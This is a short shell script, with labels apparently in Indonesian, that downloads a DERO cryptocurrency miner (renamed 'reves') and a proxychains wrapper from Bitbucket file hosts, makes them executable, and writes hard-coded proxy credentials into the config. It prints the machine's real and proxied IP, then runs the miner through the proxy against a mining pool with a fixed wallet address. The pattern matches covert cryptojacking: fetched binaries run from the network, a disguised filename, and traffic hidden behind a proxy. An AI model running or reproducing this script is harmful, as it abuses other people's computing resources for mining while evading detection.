proxy="188.166.113.250" 
port="80" 
user="bian15"  
pass="150788"
wget -q -O reves https://bitbucket.org/asertasamila/sarita/downloads/dero-stratum-miner && chmod +x reves
wget -q https://bitbucket.org/alitasantana/denada/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/alitasantana/denada/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/alitasantana/denada/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./reves -r pool.whalesburg.com:4300 -w dero1qyc95cuufup67sf6kykepuhtnps3g2xxkgxrq2c7h4rm0z7esz0p2qqqawa77.yui
#
